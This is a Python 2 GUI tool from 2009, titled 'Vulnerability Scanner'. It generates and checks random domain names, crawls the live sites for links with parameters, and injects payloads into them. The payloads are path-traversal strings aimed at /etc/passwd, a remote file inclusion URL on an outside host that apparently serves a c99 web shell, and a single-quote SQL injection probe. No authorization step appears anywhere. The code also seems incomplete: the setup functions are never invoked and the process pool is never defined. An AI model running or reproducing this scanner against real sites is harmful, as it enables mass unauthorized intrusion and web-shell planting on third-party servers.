#! /usr/bin/env python
# 20.04.2009 <-> 26.08.2009 | cmiN
# non-standard modules = ( Pmw )



from Tkinter import *
from multiprocessing import Pool, freeze_support
from winsound import Beep
from formatter import NullFormatter
from htmllib import HTMLParser
import tkFont, tkMessageBox, tkFileDialog, Pmw, socket, urllib2, urlparse



def frames():
    global root, Font
    root=Tk()
    Font=tkFont.Font(family='Comic Sans MS', size=9, weight='bold')
    frame=Frame(root)
    frame.option_add("*font", Font)
    


def widgets():
    global cb1, cb2, cvar1, cvar2, evar1, box, info_list
    global rvar1, rvar2, evar2, entry2, button5, entry3, entry4
    global evar3, evar4, cvar3, cvar4, cvar5, cvar6, cvar7, button7
    global cvar8, cvar9, cvar10, button10, button6, button11
    global button4, combo3, button4, button3, bvar1, rvar3
    global rvar4, combo4, cvar11, evar5, evar6, entry5, entry6

    ####################### Variables #######################
    cvar1=IntVar()
    cvar2=IntVar()
    cvar3=IntVar()
    cvar4=IntVar()
    cvar5=IntVar()
    cvar6=IntVar()
    cvar7=IntVar()
    cvar9=IntVar()
    cvar10=IntVar()
    cvar11=IntVar()
    rvar1=IntVar()
    rvar2=IntVar()
    rvar3=IntVar()
    rvar4=IntVar()
    evar1=StringVar()
    evar2=StringVar()
    evar3=StringVar()
    evar4=StringVar()
    evar5=StringVar()
    evar6=StringVar()
    bvar1=StringVar()

    #######################    TABS   #######################
    notebook=Pmw.NoteBook(root)
    notebook.pack(fill="both", expand=1, padx=5, pady=5)
    page1=notebook.add("Generator")
    page2=notebook.add("Scanner")
    page3=notebook.add("Settings")
    group1=Pmw.Group(page1, tag_text="Generate sites: ")
    group2=Pmw.Group(page2, tag_text="Scan for vulnerabilities: ")
    group3=Pmw.Group(page3, tag_text="Set options: ")
    group1.pack(fill="both", expand=1, padx=5, pady=5)
    group2.pack(fill="both", expand=1, padx=5, pady=5)
    group3.pack(fill="both", expand=1, padx=5, pady=5)
    notebook.tab("Generator").focus_set()
    notebook.setnaturalsize()

    ####################### GENERATOR #######################
    label1=Label(group1.interior(), text="String length: ")
    label1.grid(row=1, column=0, pady=10, padx=10)

    cb1=Pmw.ComboBox(group1.interior(), label_text="From: ", labelpos="nw", entry_insertontime=0,
                     scrolledlist_items=numbers, entry_width=15)
    cb2=Pmw.ComboBox(group1.interior(), label_text="To: ", labelpos="nw", entry_insertontime=0,
                     scrolledlist_items=numbers, entry_width=15)
    cb1.grid(row=1, column=1, pady=10, padx=10)
    cb2.grid(row=1, column=2, pady=10, padx=10)
    cb1.selectitem(numbers[0])
    cb2.selectitem(numbers[0])

    

    check1=Checkbutton(group1.interior(), text="a-z (26)", variable=cvar1, command=en_di_generatebutton)
    check2=Checkbutton(group1.interior(), text="0-9 (10)", variable=cvar2, command=en_di_generatebutton)
    check1.grid(sticky="w", row=2, column=0, pady=10, padx=10)
    check2.grid(row=2, column=2, pady=10, padx=10)

    entry3=Entry(group1.interior(), textvariable=evar3, width=2)
    entry4=Entry(group1.interior(), textvariable=evar4, width=2)
    entry3.grid(sticky="w", row=2, column=1, pady=10, padx=10)
    entry4.grid(sticky="e", row=2, column=1, pady=10, padx=10)

    label2=Label(group1.interior(), text="< - >")
    label2.grid(row=2, column=1, pady=10, padx=10)

    check3=Checkbutton(group1.interior(), text='" - " (1)', variable=cvar3, command=en_di_generatebutton)
    check3.grid(sticky="w", row=3, column=0, pady=10, padx=10)
   
    rb1=Radiobutton(group1.interior(), text="Any site", value=1, variable=rvar1)
    rb2=Radiobutton(group1.interior(), text="Only valid", value=0, variable=rvar1)
    rb1.grid(row=3, column=1, pady=10, padx=10)
    rb2.grid(row=3, column=2, pady=10, padx=10)
    rvar1.set(0)

    box=Pmw.ScrolledListBox(group1.interior(), items=domains, labelpos="nw", label_text="Domains: ",
                            listbox_height=6, usehullsize=1, hull_width=70, hull_height=100
                            )
    box.grid(row=4, column=2, pady=10, padx=10)

    entry1=Entry(group1.interior(), textvariable=evar1, width=5)
    entry1.grid(row=4, column=0, pady=10, padx=10)
    entry1.focus_set()

    button1=Button(group1.interior(), text=" ->     Add domain", command=lambda arg="add": add_delete(arg), width=20)
    button2=Button(group1.interior(), text="Delete selected <-", command=lambda arg="delete": add_delete(arg), width=20)
    button1.grid(sticky="e", row=4, column=1, pady=10, padx=10)
    button2.grid(sticky="se", row=4, column=1, pady=10, padx=10)

    button3=Button(group1.interior(), text="Test settings", command=test, fg="red", width=20)
    button3.grid(sticky="sw", row=5, column=1, pady=30, padx=10)

    button4=Button(group1.interior(), text="Generate!", command=lambda arg="generate": action(arg), fg="orange", bg="black", width=20)
    button4.grid(sticky="s", row=5, column=2, pady=30, padx=10)

    info_list=Pmw.TextDialog(group1.interior(), scrolledtext_labelpos="n", title="Info",
                             defaultbutton=0, label_text="Test results..."
                             )
    info_list.withdraw()

    en_di_generatebutton()

    ####################### SCANNER #######################
    rb3=Radiobutton(group2.interior(), text="Enter site", value=1, variable=rvar2,
                    command=en_di_site)
    rb4=Radiobutton(group2.interior(), text="Browse list", value=0, variable=rvar2,
                    command=en_di_site)
    rb3.grid(sticky="w", row=0, column=0, pady=10, padx=10)
    rb4.grid(sticky="w", row=1, column=0, pady=10, padx=10)
    rvar2.set(1)

    label3=Label(group2.interior(), text="http://")
    label3.grid(row=0, column=1, pady=10)

    entry2=Entry(group2.interior(), textvariable=evar2, width=20)
    entry2.grid(row=0, column=2, pady=10)
    entry2.focus_set()

    label4=Label(group2.interior(), text="")
    label4.grid(row=0, column=3, pady=10)

    button5=Button(group2.interior(), textvariable=bvar1, command=browse1, width=20)
    button5.grid(row=1, column=2, pady=10, padx=10)

    bvar1.set("...")

    en_di_site()
    
    check10=Checkbutton(group2.interior(), text="Default vectors / words", variable=cvar10)
    check10.grid(sticky="w", row=2, column=0, pady=10, padx=10)

    check7=Checkbutton(group2.interior(), text="Vectors / words lists", variable=cvar7, command=en_di_vector_word)
    check7.grid(sticky="w", row=3, column=0, pady=10, padx=10)

    combo3=Pmw.ComboBox(group2.interior(), label_text="Vulnerability: ", labelpos="nw", entry_insertontime=0,
                     scrolledlist_items=vulnerabilities, entry_width=5)
    combo3.grid(row=2, column=2, pady=10, padx=10)
    combo3.selectitem(vulnerabilities[0])

    button7=Button(group2.interior(), text="Vectors list...", command=browse2, width=20)
    button7.grid(row=3, column=2, pady=10, padx=10)

    button10=Button(group2.interior(), text="Words list...", command=browse3, width=20)
    button10.grid(row=4, column=2, pady=10, padx=10)

    en_di_vector_word()

    check9=Checkbutton(group2.interior(), text="Verbose: ON/OFF", variable=cvar9)
    check9.grid(sticky="w", row=4, column=0, pady=10, padx=10)

    check4=Checkbutton(group2.interior(), text="LFI ", variable=cvar4, command=en_di_scanbutton)
    check5=Checkbutton(group2.interior(), text="RFI ", variable=cvar5, command=en_di_scanbutton)
    check6=Checkbutton(group2.interior(), text="SQLI", variable=cvar6, command=en_di_scanbutton)
    check4.grid(row=5, column=0, pady=10, padx=10)
    check5.grid(row=5, column=1, pady=10, padx=10)
    check6.grid(row=5, column=2, pady=10, padx=10)

    button6=Button(group2.interior(), text="Scan!", command=lambda arg="scan": action(arg),
                   fg="orange", bg="black", width=20)
    button6.grid(row=6, column=2, pady=10, padx=10)

    button11=Button(group2.interior(), text="Extract links only!", command=lambda arg="extract": action(arg),
                    fg="green", bg="black", width=20)
    button11.grid(row=6, column=0, pady=10, padx=10)

    en_di_scanbutton()

    ####################### SETTINGS #######################
    check11=Checkbutton(group3.interior(), text="HTTP proxy: ", variable=cvar11, command=en_di_proxy)
    check11.grid(sticky="w", row=0, column=0, padx=10, pady=20)

    label5=Label(group3.interior(), text="Address: ")
    label5.grid(sticky="e", row=1, column=0, padx=10)

    entry5=Entry(group3.interior(), textvariable=evar5, width=20)
    entry5.grid(sticky="w", row=1, column=1, padx=10)

    label6=Label(group3.interior(), text="Port: ")
    label6.grid(sticky="e", row=1, column=2, padx=10)

    entry6=Entry(group3.interior(), textvariable=evar6, width=10)
    entry6.grid(sticky="w", row=1, column=3, padx=10)

    entry5.focus_set()
    en_di_proxy()

    label7=Label(group3.interior(), text="Timeout: ")
    label7.grid(sticky="w", row=2, column=0, padx=10, pady=20)

    combo4=Pmw.ComboBox(group3.interior(), entry_insertontime=0,
                        scrolledlist_items=numbers, entry_width=5)
    combo4.grid(sticky="w", row=2, column=1, padx=10)
    combo4.selectitem(numbers[0])

    label8=Label(group3.interior(), text="seconds")
    label8.grid(sticky="e", row=2, column=1)

    label9=Label(group3.interior(), text="Search for links from: ")
    label9.grid(sticky="w", row=3, column=1, padx=10, pady=10)

    radio5=Radiobutton(group3.interior(), text="Base URL", value=0, variable=rvar3)
    radio6=Radiobutton(group3.interior(), text="All URLs", value=1, variable=rvar3)
    radio5.grid(sticky="w", row=4, column=1, padx=10)
    radio6.grid(sticky="w", row=5, column=1, padx=10)
    rvar3.set(0)

    label9=Label(group3.interior(), text="Search for links with: ")
    label9.grid(sticky="w", row=6, column=1, padx=10, pady=10)

    radio7=Radiobutton(group3.interior(), text="Parameters", value=0, variable=rvar4)
    radio8=Radiobutton(group3.interior(), text="All links", value=1, variable=rvar4)
    radio7.grid(sticky="w", row=7, column=1, padx=10)
    radio8.grid(sticky="w", row=8, column=1, padx=10)
    rvar4.set(0)
    
    
    #######################   HELP  #######################
    pass

    ####################### Credits #######################
    authors=Label(root, text="http://rstcenter.com", fg="dark green")
    authors.pack(side="bottom", anchor="s")


def tables():
    global chr_table, nr_table, numbers, domains, vulnerabilities
    global LFI_table, RFI_table, SQLI_table, LFI_word, RFI_word, SQLI_word
    chr_table=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
               'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
               ]
    nr_table=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    numbers=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]
    domains=["ro", "com", "info", "org", "net", "eu", "it", "de", "kr", "be", "biz",
             "es", "cn", "tw", "uk", "ru", "nl"]
    vulnerabilities=["LFI", "RFI", "SQLI"]
    LFI_table=["/etc/passwd", "/etc/passwd%00",
               "../etc/passwd", "../etc/passwd%00",
               "../../etc/passwd", "../../etc/passwd%00",
               "../../../etc/passwd", "../../../etc/passwd%00",
               "../../../../etc/passwd", "../../../../etc/passwd%00",
               "../../../../../etc/passwd", "../../../../../etc/passwd%00",
               "../../../../../../etc/passwd", "../../../../../../etc/passwd%00",
               "../../../../../../../etc/passwd", "../../../../../../../etc/passwd%00",
               "../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd%00",
               "../../../../../../../../../etc/passwd", "../../../../../../../../../etc/passwd%00",]
    LFI_word=["root"]
    RFI_table=["http://r57.gen.tr/99.txt", "http://r57.gen.tr/99.txt?"]
    RFI_word=["c99"]
    SQLI_table=["'"]
    SQLI_word=["QF"]
    



def generate_and_verify(table, ini, fin, cdomainsbox, cflag, ctimeout):
    global nr, domainsbox, flag, timeout
    nr, domainsbox, flag, timeout=0, cdomainsbox, cflag, ctimeout
    ini, fin=int(ini), int(fin)
    socket.setdefaulttimeout(timeout)
    while ini <= fin:
        txt=file("generated_sites.txt", "a")
        z=ini
        sites=""
        for x in table:
            word1=x
            if z > 1:
                for x in table:
                    word2=word1+x
                    if z > 2:
                        for x in table:
                            word3=word2+x
                            if z > 3:
                                for x in table:
                                    word4=word3+x
                                    if z > 4:
                                        for x in table:
                                            word5=word4+x
                                            if z > 5:
                                                for x in table:
                                                    word6=word5+x
                                                    if z > 6:
                                                        for x in table:
                                                            word7=word6+x
                                                            if z > 7:
                                                                for x in table:
                                                                    word8=word7+x
                                                                    if z > 8:
                                                                        for x in table:
                                                                            word9=word8+x
                                                                            if z > 9:
                                                                                for x in table:
                                                                                    word10=word9+x
                                                                                    sites+=verify(word10)
                                                                                txt.write(sites)
                                                                                sites=""
                                                                            else:
                                                                                sites+=verify(word9)
                                                                        txt.write(sites)
                                                                        sites=""
                                                                    else:
                                                                        sites+=verify(word8)
                                                                txt.write(sites)
                                                                sites=""
                                                            else:
                                                                sites+=verify(word7)
                                                        txt.write(sites)
                                                        sites=""
                                                    else:
                                                        sites+=verify(word6)
                                                txt.write(sites)
                                                sites=""
                                            else:
                                                sites+=verify(word5)
                                        txt.write(sites)
                                        sites=""
                                    else:
                                        sites+=verify(word4)
                                txt.write(sites)
                                sites=""
                            else:
                                sites+=verify(word3)
                        txt.write(sites)
                        sites=""
                    else:
                        sites+=verify(word2)
                txt.write(sites)
                sites=""
            else:
                sites+=verify(word1)
        txt.write(sites)
        sites=""
        ini=ini+1
        txt.close()
    return ["generate"]



def verify(word):
    global nr
    sites=""
    for x in domainsbox:
        site="http://"+word+"."+x
        try:
            if flag==0:
                sock=urllib2.urlopen(site, timeout=timeout)
                sock.close()
        except:
            pass
        else:
            sites+=site+"\n"
            nr=nr+1
    return sites



def scan(sites, LFI_vectors, RFI_vectors, SQLI_vectors,
         LFI_words, RFI_words, SQLI_words, verbose, task, timeout, level, proxy_support):
    report("Scanner started!\n\n\n", "Scanner started!\n\n\n", verbose)
    report("", "\n\nSites: \n\n", verbose)
    for x in sites:
        report("", x+"\n", verbose)
    links=[]
    for x in sites:
        try:
            links+=crawler(x, timeout, level, "parameters")
        except socket.timeout:
            report("\n\nTimed out: "+x, "\n\nTimed out: "+x, verbose)
        except urllib2.URLError, error:
            if str(error)=="<urlopen error timed out>":
                report("\n\nTimed out: "+x, "\n\nTimed out: "+x, verbose)
            else:
                report("\n\nInvalid: "+x, "\n\nInvalid: "+x, verbose)
    for x in range(len(links)):
        parsedlink=urlparse.urlsplit(links[x])
        links[x]=links[x][:links[x].index("?")+1]
        parameters=parsedlink.query.split("&")
        for y in parameters:
            links[x]+=y[:y.index("=")+1]+"1337_vector&"
        links[x]=links[x].strip("&")
    for x in links:
        for y in range(links.count(x)-1):
            links.remove(x)
    report("", "\n\nLinks crawled from sites's sources: \n\n", verbose)
    for x in links:
        report("", x+"\n", verbose)
    if proxy_support[0]:
        proxy={"http": proxy_support[1]}
    else:
        proxy=None
    proxy_handler=urllib2.ProxyHandler(proxy)
    opener=urllib2.build_opener(proxy_handler)
    if "LFI" in task:
        LFI(links, LFI_vectors, LFI_words, verbose, timeout, opener)
    if "RFI" in task:
        RFI(links, RFI_vectors, RFI_words, verbose, timeout, opener)
    if "SQLI" in task:
        SQLI(links, SQLI_vectors, SQLI_words, verbose, timeout, opener)
    report("\n\nScanner finished!\n\n\n", "\n\nScanner finished!\n\n\n", verbose)
    return ["scan"]



def crawler(url, timeout, level, flag):
    links, visited_links, links_to_visit=[], [], []
    socket.setdefaulttimeout(timeout)
    rootnetloc=urlparse.urlsplit(url, allow_fragments=False).netloc
    if rootnetloc.count("www") > 0:
        wordindex=rootnetloc.index("www")
        rootnetloc=rootnetloc[:wordindex]+rootnetloc[wordindex+3:]
    result=extractor(url, timeout, flag, rootnetloc)
    links+=result[1]
    if level=="index":
        status=False
    else:
        links_to_visit+=result[0]
        status=True
    while status:
        status=False
        for x in links_to_visit:
            links_to_visit=[]
            if not x in visited_links:
                visited_links.append(x)
                status=True
                try:
                    result=extractor(x, timeout, flag, rootnetloc)
                except:
                    pass
                else:
                    links_to_visit+=result[0]
                    links+=result[1]
        for x in links_to_visit:
            for y in range(links_to_visit.count(x)-1):
                links_to_visit.remove(x)
    for x in links:
        for y in range(links.count(x)-1):
            links.remove(x)
    return links

def extractor(url, timeout, flag, rootnetloc):
    sock=urllib2.urlopen(url, timeout=timeout)
    parser=HTMLParser(NullFormatter())
    parser.feed(sock.read())
    sock.close()
    parser.close()
    brut_links=parser.anchorlist
    net_links, dev_net_links=[], []
    parsedurl=urlparse.urlsplit(url, allow_fragments=False)
    for x in brut_links:
        parsedlink=urlparse.urlsplit(x, allow_fragments=False)
        if parsedlink.scheme=="":
            link=urlparse.urljoin(parsedurl.geturl(), parsedlink.geturl())
            if not link in net_links:
                net_links.append(link)
        else:
            if rootnetloc in parsedlink.netloc:
                link=parsedlink.geturl()
                if not link in net_links:
                    net_links.append(link)
    if flag=="parameters":
        for x in net_links:
            parsedlink=urlparse.urlsplit(x, allow_fragments=False)
            if not parsedlink.query=="":
                dev_net_links.append(parsedlink.geturl())
    else:
        dev_net_links=net_links
    return net_links, dev_net_links
        


def LFI(links, LFI_vectors, LFI_words, verbose, timeout, opener):
    report("\n\nScanning for LFI...\n\n", "\n\nScanning for LFI...\n\n", verbose)
    report("", "\n\nVectors: \n\n", verbose)
    for x in LFI_vectors:
        report("", x+"\n", verbose)
    report("", "\n\nWords to search for: \n\n", verbose)
    for x in LFI_words:
        report("", x+"\n", verbose)
    for x in links:
        status=False
        for y in LFI_vectors:
            if status is True:
                break
            try:
                site=x.replace("1337_vector", y)
                hibrid_site=x.replace("1337_vector", y[:y.index("%00")]+"1337"+y[y.index("%00"):])
            except:
                hibrid_site=x.replace("1337_vector", y + "1337")
            finally:
                try:
                    source=opener.open(site, timeout=timeout).read()
                    hibrid_source=opener.open(hibrid_site, timeout=timeout).read()
                except socket.timeout:
                    report("\n\nTimed out: "+site, "\n\nTimed out: "+site, verbose)
                except urllib2.URLError, error:
                    if str(error)=="<urlopen error timed out>":
                        report("\n\nTimed out: "+site, "\n\nTimed out: "+site, verbose)
                else:
                    for z in LFI_words:
                        if source.count(z) != hibrid_source.count(z):
                            report("\n\nLFI: "+site, "\n\nLFI: "+site, verbose)
                            status=True
                            break
    report("\n\nScanning for LFI finished!\n\n", "\n\nScanning for LFI finished!\n\n", verbose)
                


def RFI(links, RFI_vectors, RFI_words, verbose, timeout, opener):
    report("\n\nScanning for RFI...\n\n", "\n\nScanning for RFI...\n\n", verbose)
    report("", "\n\nVectors: \n\n", verbose)
    for x in RFI_vectors:
        report("", x+"\n", verbose)
    report("", "\n\nWords to search for: \n\n", verbose)
    for x in RFI_words:
        report("", x+"\n", verbose)
    for x in links:
        status=False
        for y in RFI_vectors:
            if status is True:
                break
            try:
                site=x.replace("1337_vector", y)
                hibrid_site=x.replace("1337_vector", y[:y.index("?")]+"1337"+y[y.index("?"):])
            except:
                hibrid_site=x.replace("1337_vector", y + "1337")
            finally:
                try:
                    source=opener.open(site, timeout=timeout).read()
                    hibrid_source=opener.open(hibrid_site, timeout=timeout).read()
                except socket.timeout:
                    report("\n\nTimed out: "+site, "\n\nTimed out: "+site, verbose)
                except urllib2.URLError, error:
                    if str(error)=="<urlopen error timed out>":
                        report("\n\nTimed out: "+site, "\n\nTimed out: "+site, verbose)
                else:
                    for z in RFI_words:
                        if source.count(z) != hibrid_source.count(z):
                            report("\n\nRFI: "+site, "\n\nRFI: "+site, verbose)
                            status=True
                            break
    report("\n\nScanning for RFI finished!\n\n", "\n\nScanning for RFI finished!\n\n", verbose)



def SQLI(links, SQLI_vectors, SQLI_words, verbose, timeout, opener):
    report("\n\nScanning for SQLI...\n\n", "\n\nScanning for SQLI...\n\n", verbose)
    report("", "\n\nVectors: \n\n", verbose)
    for x in SQLI_vectors:
        report("", x+"\n", verbose)
    report("", "\n\nWords to search for: \n\n", verbose)
    for x in SQLI_words:
        report("", x+"\n", verbose)
    for x in links:
        status=False
        for y in SQLI_vectors:
            if status is True:
                break
            try:
                site=x.replace("1337_vector", y)
                hibrid_site=x.replace("1337_vector", "1337")
            finally:
                try:
                    source=opener.open(site, timeout=timeout).read()
                    hibrid_source=opener.open(hibrid_site, timeout=timeout).read()
                except socket.timeout:
                    report("\n\nTimed out: "+site, "\n\nTimed out: "+site, verbose)
                except urllib2.URLError, error:
                    if str(error)=="<urlopen error timed out>":
                        report("\n\nTimed out: "+site, "\n\nTimed out: "+site, verbose)
                else:
                    for z in SQLI_words:
                        if source.count(z) != hibrid_source.count(z):
                            report("\n\nSQLI: "+site, "\n\nSQLI: "+site, verbose)
                            status=True
                            break
    report("\n\nScanning for SQLI finished!\n\n", "\n\nScanning for SQLI finished!\n\n", verbose)
    


def msgbox(type, msg):
    if type=="showinfo":
        tkMessageBox.showinfo(title="Info", message=msg)
    elif type=="showerror":
        tkMessageBox.showerror(title="Error", message=msg)
    elif type=="showwarning":
        tkMessageBox.showwarning(title="Warning", message=msg)    



def add_delete(type):
    if type=="add":
        items_list=box.get()+(evar1.get(), )
    else:
        if box.getvalue()==():
            box.clear()
            return
        else:
            items_list=[]
            items_list[:]=box.get()
            items_list.remove(box.getvalue()[0])
    box.setlist(items_list)


def test():
    result=exceptions1()
    if not result[0]:
        return
    timeout=result[2]
    try:
        sock=urllib2.urlopen("http://www.google.com", timeout=timeout)
        sock.close()
    except:
        conn="OFF"
        msgbox("showwarning", "May be a problem with your internet connection or try another timeout value.")
    else:
        conn="ON"
        msgbox("showinfo", "Connection seems to be ok.")
    y, z=int(cb1.get()), int(cb2.get())
    d=len(box.get())
    c=len(result[1])
    n=0
    for x in range(y, z+1):
        n+=(c**x)*d
    if rvar1.get()==0:
        t_s=float(n)/0.7
        t_h=t_s/3600
    else:
        t_s=float(n)/800000
        t_h=t_s/3600
    info_list.configure(text_state="normal")
    info_list.clear()
    info_list.insert("end", "Internet connection: "+conn+"\n")
    info_list.insert("end", "Number of combinations: "+str(n)+"\n")
    info_list.insert("end", "Approximately time to complete: "+str(t_s)+" seconds, "+str(t_h)+" hours\n")
    info_list.configure(text_state="disabled")
    info_list.activate()


def browse1():
    global txtsites
    ftypes=[('Text Documents', '*.txt'),
            ('Word Documents', '*.doc'),
            ('XML Files', '*.xml')
           ]
    try:
        txt_list=tkFileDialog.askopenfile(parent=root, mode='r',
                                          title='Chose a text based file', filetypes=ftypes
                                          )
        if not txt_list is None:
            variable=txt_list.readlines()
            txtsites=[]
            for x in variable:
                txtsites.append(x.replace("\n", ""))
            name=txt_list.name.split("/")
            name=name[len(name)-1]
            bvar1.set(name)
    except:
        msgbox("showerror", "Invalid file or list!")



def browse2():
    type=combo3.get()
    global LFI_txtvectors, RFI_txtvectors, SQLI_txtvectors
    ftypes=[('Text Documents', '*.txt'),
            ('Word Documents', '*.doc'),
            ('XML Files', '*.xml')
           ]
    try:
        txt_list=tkFileDialog.askopenfile(parent=root, mode='r',
                                          title='Chose a text based file', filetypes=ftypes
                                          )
        if not txt_list is None:
            variable=txt_list.readlines()
            list=[]
            for x in variable:
                list.append(x.replace("\n", ""))
            if type=="LFI":
                LFI_txtvectors=list
            if type=="RFI":
                RFI_txtvectors=list
            if type=="SQLI":
                SQLI_txtvectors=list
    except:
        msgbox("showerror", "Invalid file or list!")



def browse3():
    type=combo3.get()
    global LFI_txtwords, RFI_txtwords, SQLI_txtwords
    ftypes=[('Text Documents', '*.txt'),
            ('Word Documents', '*.doc'),
            ('XML Files', '*.xml')
           ]
    try:
        txt_list=tkFileDialog.askopenfile(parent=root, mode='r',
                                          title='Chose a text based file', filetypes=ftypes
                                          )
        if not txt_list is None:
            variable=txt_list.readlines()
            list=[]
            for x in variable:
                list.append(x.replace("\n", ""))
            if type=="LFI":
                LFI_txtwords=list
            if type=="RFI":
                RFI_txtwords=list
            if type=="SQLI":
                SQLI_txtwords=list
    except:
        msgbox("showerror", "Invalid file or list!")



def en_di_site():
    if rvar2.get()==1:
        entry2["state"]="normal"
        button5["state"]="disabled"
    else:
        entry2["state"]="disabled"
        button5["state"]="normal"



def en_di_vector_word():
    if cvar7.get()==1:
        button7["state"]="normal"
        button10["state"]="normal"
        combo3.component("entryfield").component("entry").configure(state="normal")
        combo3.component("arrowbutton").bind("<Button-1>",combo3._postList)
    else:
        button7["state"]="disabled"
        button10["state"]="disabled"
        combo3.component("entryfield").component("entry").configure(state="disabled")
        combo3.component("arrowbutton").unbind("<Button-1>")



def en_di_scanbutton():
    if cvar4.get()==0 and cvar5.get()==0 and cvar6.get()==0:
        button6["state"]="disabled"
    else:
        button6["state"]="normal"



def en_di_generatebutton():
    if cvar1.get()==0 and cvar2.get()==0 and cvar3.get()==0:
        button4["state"]="disabled"
        button3["state"]="disabled"
    else:
        button4["state"]="normal"
        button3["state"]="normal"
    if cvar1.get()==1:
        entry3["state"]="normal"
        entry4["state"]="normal"
    else:
        entry3["state"]="disabled"
        entry4["state"]="disabled"



def en_di_proxy():
    if cvar11.get()==0:
        entry5["state"]="disabled"
        entry6["state"]="disabled"
    else:
        entry5["state"]="normal"
        entry6["state"]="normal"



def exceptions1():
    table=[]
    if not cb1.get() in numbers or not cb2.get() in numbers:
        msgbox("showerror", "Incorrect string length!")
        return [False]
    if int(cb1.get()) > int(cb2.get()):
        msgbox("showerror", "The initial string length mustn't be greater than the final string length!")
        return [False]
    if box.get()==():
        msgbox("showerror", "Your domains's list mustn't be empty!")
        return [False]
    if cvar2.get()==1:
        table+=nr_table
    if cvar3.get()==1:
        table+=["-"]
    try:
        timeout=int(combo4.get())
    except:
        msgbox("showerror", "Invalid timeout!")
        return [False]
    socket.setdefaulttimeout(timeout)
    if cvar1.get()==1:
        if len(evar3.get()) == 0 and len(evar4.get()) == 0:
            table+=chr_table
            return [True, table, timeout]
        if (not evar3.get() in chr_table) or (not evar4.get() in chr_table):
            msgbox("showerror", "Both entries must be empty or contain characters from [a, z]!")
            return [False]
        for x in range(0, 26):
            if chr_table[x]==evar3.get():
                i=x
            if chr_table[x]==evar4.get():
                f=x
        if i > f:
            msgbox("showerror", "The first letter must be before the last letter!")
            return [False]
        else:
            table+=chr_table[i:f+1]
    return [True, table, timeout]



def exceptions2_1():
    if rvar2.get()==0:
        try:
            sites=txtsites
        except:
            msgbox("showerror", "Missing or invalid sites list!")
            return [False]
    else:
        sites=["http://"+evar2.get()]
    if cvar11.get()==1:
        proxy_support=[True, evar5.get()+":"+evar6.get()]
    else:
        proxy_support=[False, None]
    try:
        timeout=int(combo4.get())
    except:
        msgbox("showerror", "Invalid timeout!")
        return [False]
    if rvar3.get()==0:
        level="index"
    else:
        level="all"
    if rvar4.get()==0:
        flag="parameters"
    else:
        flag="all"
    return [True, sites, timeout, level, flag, proxy_support]
    


def exceptions2_2():
    LFI_vectors, RFI_vectors, SQLI_vectors=[], [], []
    LFI_words, RFI_words, SQLI_words, task=[], [], [], []
    if cvar10.get()==0 and cvar7.get()==0:
        msgbox("showerror", "Vectors / words table is empty!")
        return [False]
    try:
        if cvar4.get()==1:
            if cvar10.get()==1:
                LFI_vectors+=LFI_table
                LFI_words+=LFI_word
            if cvar7.get()==1:
                LFI_vectors+=LFI_txtvectors
                LFI_words+=LFI_txtwords
            task.append("LFI")
        else:
            LFI_vectors=None
            LFI_words=None
        if cvar5.get()==1:
            if cvar10.get()==1:
                RFI_vectors+=RFI_table
                RFI_words+=RFI_word
            if cvar7.get()==1:
                RFI_vectors+=RFI_txtvectors
                RFI_words+=RFI_txtwords
            task.append("RFI")
        else:
            RFI_vectors=None
            RFI_words=None
        if cvar6.get()==1:
            if cvar10.get()==1:
                SQLI_vectors+=SQLI_table
                SQLI_words+=SQLI_word
            if cvar7.get()==1:
                SQLI_vectors+=SQLI_txtvectors
                SQLI_words+=SQLI_txtwords
            task.append("SQLI")
        else:
            SQLI_vectors=None
            SQLI_words=None
    except:
        msgbox("showerror", "Missing or invalid vectors / words list!")
        return [False]
    return [True, LFI_vectors, RFI_vectors, SQLI_vectors,
            task, LFI_words, RFI_words, SQLI_words]



def report(msg1, msg2, verbose):
    if verbose:
        reported=file("full_report.txt", "a")
        reported.write(msg2)
        reported.close()
    else:
        reported=file("report.txt", "a")
        reported.write(msg1)
        reported.close()



def action(type):
    if type=="generate":
        result=exceptions1()
        if not result[0]:
            return
        table=result[1]
        timeout=result[2]
        ini=cb1.get()
        fin=cb2.get()
        domainsbox=box.get()
        flag=rvar1.get()
        arguments=[table, ini, fin, domainsbox, flag, timeout]
        pool.apply_async(generate_and_verify, args=arguments, callback=callbackfunc)
        button4["text"]="Please wait..."
        button4["state"]="disabled"
    if type=="scan":
        result1=exceptions2_1()
        result2=exceptions2_2()
        if not result1[0] or not result2[0]:
            return
        if cvar9.get()==1:
            verbose=True
        else:
            verbose=False
        (sites, timeout, level, proxy_support)=(result1[1], result1[2], result1[3], result1[5])
        (LFI_vectors, RFI_vectors, SQLI_vectors,
         task, LFI_words, RFI_words, SQLI_words)=(result2[1], result2[2], result2[3],
                                                  result2[4], result2[5], result2[6], result2[7])
        arguments=[sites, LFI_vectors, RFI_vectors, SQLI_vectors,
                   LFI_words, RFI_words, SQLI_words, verbose, task, timeout, level, proxy_support]
        pool.apply_async(scan, args=arguments, callback=callbackfunc)
        button6["text"]="Please wait..."
        button6["state"]="disabled"
    if type=="extract":
        result1=exceptions2_1()
        if not result1[0]:
            return
        (sites, timeout, level, flag)=(result1[1], result1[2], result1[3], result1[4])
        arguments=[sites, timeout, level, flag]
        pool.apply_async(crawl, args=arguments, callback=callbackfunc)
        button11["text"]="Please wait..."
        button11["state"]="disabled"



def crawl(sites, timeout, level, flag):
    links=[]
    for url in sites:
        try:
            links+=crawler(url, timeout, level, flag)
        except socket.timeout:
            msgbox("showwarning", "Timed out: "+url)
        except urllib2.URLError, error:
            if str(error)=="<urlopen error timed out>":
                msgbox("showwarning", "Timed out: "+url)
            else:
                msgbox("showerror", "Invalid site: "+url)
    return["extract", links]


        
def callbackfunc(arg):
    if arg[0]=="generate":
        button4["text"]="Generate!"
        button4["state"]="normal"
        for x in range(1900, 2000):
            Beep(x, 1)
    if arg[0]=="extract":
        openedfile=file("links.txt", "a")
        for x in arg[1]:
            openedfile.write(x+"\n")
        openedfile.close()
        button11["text"]="Extract links only!"
        button11["state"]="normal"
        for x in range(0, 100):
            Beep(1000, 1)
    if arg[0]=="scan":
        button6["text"]="Scan!"
        button6["state"]="normal"
        for x in range(2000, 1900, -1):
            Beep(x, 1)
    


def end():
    root.wm_iconbitmap("icon.ico")
    root.title("Vulnerability Scanner")
